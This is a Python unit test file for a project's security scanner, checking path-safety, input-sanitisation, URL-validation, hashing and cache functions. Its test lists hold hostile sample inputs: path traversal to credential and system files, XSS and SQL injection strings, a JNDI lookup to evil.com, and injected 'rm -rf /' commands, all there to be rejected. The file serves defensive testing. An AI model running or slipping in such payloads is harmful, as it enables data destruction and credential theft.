"""Unit tests for security scanner functionality."""

import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

import pytest


@pytest.mark.unit
class TestSecurityScanner(unittest.TestCase):
    """Test security scanner functionality."""

    def setUp(self):
        """Set up test environment."""
        self.temp_dir = tempfile.mkdtemp()
        self.test_dir = Path(self.temp_dir)

    def tearDown(self):
        """Clean up test environment."""
        import shutil

        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_security_scanner_initialization(self):
        """Test SecurityScanner initialization."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            # Test with cache enabled
            scanner = SecurityScanner(cache_enabled=True)
            self.assertIsNotNone(scanner.cache)

            # Test with cache disabled
            scanner_no_cache = SecurityScanner(cache_enabled=False)
            self.assertIsNone(scanner_no_cache.cache)

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_safe_patterns_configuration(self):
        """Test that safe patterns are properly configured."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Check that safe patterns exist
            self.assertIn("file_extensions", scanner.safe_patterns)
            self.assertIn(".md", scanner.safe_patterns["file_extensions"])
            self.assertIn(".txt", scanner.safe_patterns["file_extensions"])
            self.assertIn(".yml", scanner.safe_patterns["file_extensions"])

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_safe_file_extension_detection(self):
        """Test detection of safe file extensions."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Test multiple safe file extensions
            safe_extensions = [".md", ".txt", ".yml", ".yaml", ".bib", ".tex"]
            for file_extension in safe_extensions:
                with self.subTest(extension=file_extension):
                    test_file = self.test_dir / f"test{file_extension}"
                    test_file.write_text("# Test content")

                    # Test that safe extensions are properly identified
                    if hasattr(scanner, "is_safe_file_extension"):
                        self.assertTrue(scanner.is_safe_file_extension(test_file))

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Test dangerous paths
            dangerous_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32",
                "/etc/passwd",
                "~/.ssh/id_rsa",
                "C:\\Windows\\System32\\config\\SAM",
            ]

            for dangerous_path in dangerous_paths:
                if hasattr(scanner, "validate_path_safety"):
                    self.assertFalse(scanner.validate_path_safety(dangerous_path))

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_input_sanitization(self):
        """Test input sanitization functionality."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Test dangerous inputs
            dangerous_inputs = [
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "${jndi:ldap://evil.com/}",
                "$(rm -rf /)",
                "`rm -rf /`",
            ]

            for dangerous_input in dangerous_inputs:
                if hasattr(scanner, "sanitize_input"):
                    sanitized = scanner.sanitize_input(dangerous_input)
                    self.assertNotEqual(sanitized, dangerous_input)
                    self.assertNotIn("<script>", sanitized.lower())

        except ImportError:
            self.skipTest("Security scanner module not available")

    @patch("subprocess.run")
    def test_dependency_vulnerability_scanning(self, mock_run):
        """Test dependency vulnerability scanning."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Mock successful vulnerability scan
            mock_run.return_value = Mock(returncode=0, stdout="No known vulnerabilities found", stderr="")

            if hasattr(scanner, "scan_dependencies"):
                # Create a test requirements.txt file
                requirements_file = self.test_dir / "requirements.txt"
                requirements_file.write_text("pytest>=7.0.0\nrequests>=2.28.0\n")

                result = scanner.scan_dependencies(requirements_file=requirements_file)
                self.assertIsNotNone(result)
                mock_run.assert_called()

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_file_hash_validation(self):
        """Test file integrity validation through hashing."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Create test file
            test_file = self.test_dir / "test.txt"
            test_content = "This is a test file for hash validation"
            test_file.write_text(test_content)

            if hasattr(scanner, "calculate_file_hash"):
                hash1 = scanner.calculate_file_hash(test_file)
                self.assertIsNotNone(hash1)
                self.assertIsInstance(hash1, str)
                self.assertTrue(len(hash1) > 0)

                # Modify file and verify hash changes
                test_file.write_text(test_content + " modified")
                hash2 = scanner.calculate_file_hash(test_file)
                self.assertNotEqual(hash1, hash2)

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_url_validation(self):
        """Test URL validation for security."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Test safe URLs
            safe_urls = [
                "https://example.com/api/data",
                "https://doi.org/10.1000/123",
                "https://api.crossref.org/works",
                "https://github.com/user/repo",
            ]

            # Test dangerous URLs
            dangerous_urls = [
                "file:///etc/passwd",
                "javascript:alert('xss')",
                "ftp://192.168.1.1/sensitive",
                "http://localhost:22/ssh",
            ]

            if hasattr(scanner, "validate_url_safety"):
                for url in safe_urls:
                    self.assertTrue(scanner.validate_url_safety(url))

                for url in dangerous_urls:
                    self.assertFalse(scanner.validate_url_safety(url))

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_cache_integration(self):
        """Test cache integration for security scan results."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            # Test with cache enabled
            scanner_with_cache = SecurityScanner(cache_enabled=True)
            self.assertIsNotNone(scanner_with_cache.cache)

            # Test with cache disabled
            scanner_no_cache = SecurityScanner(cache_enabled=False)
            self.assertIsNone(scanner_no_cache.cache)

            # Test cache operations if available
            if hasattr(scanner_with_cache, "cache_scan_result"):
                test_key = "test_scan_key"
                test_result = {"status": "safe", "vulnerabilities": []}

                scanner_with_cache.cache_scan_result(test_key, test_result)
                cached_result = scanner_with_cache.get_cached_scan_result(test_key)
                self.assertEqual(cached_result, test_result)

        except ImportError:
            self.skipTest("Security scanner module not available")


@pytest.mark.unit
class TestSecurityScannerEdgeCases(unittest.TestCase):
    """Test edge cases and error conditions in security scanner."""

    def test_scanner_with_invalid_input(self):
        """Test scanner behavior with invalid input."""
        try:
            import sys

            sys.path.insert(0, "src")
            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Test with None input
            if hasattr(scanner, "validate_path_safety"):
                self.assertFalse(scanner.validate_path_safety(None))

            if hasattr(scanner, "sanitize_input"):
                self.assertEqual(scanner.sanitize_input(None), "")

        except ImportError:
            self.skipTest("Security scanner module not available")

    def test_scanner_performance_with_large_files(self):
        """Test scanner performance with large files."""
        try:
            import sys

            sys.path.insert(0, "src")
            import time

            from rxiv_maker.security.scanner import SecurityScanner

            scanner = SecurityScanner()

            # Create a large test file
            import tempfile

            with tempfile.NamedTemporaryFile(mode="w", delete=False) as f:
                large_content = "A" * 1000000  # 1MB of content
                f.write(large_content)
                large_file_path = Path(f.name)

            try:
                if hasattr(scanner, "calculate_file_hash"):
                    start_time = time.time()
                    hash_result = scanner.calculate_file_hash(large_file_path)
                    end_time = time.time()

                    # Should complete within reasonable time
                    self.assertLess(end_time - start_time, 5.0)  # Under 5 seconds
                    self.assertIsNotNone(hash_result)
            finally:
                large_file_path.unlink(missing_ok=True)

        except ImportError:
            self.skipTest("Security scanner module not available")


if __name__ == "__main__":
    unittest.main()
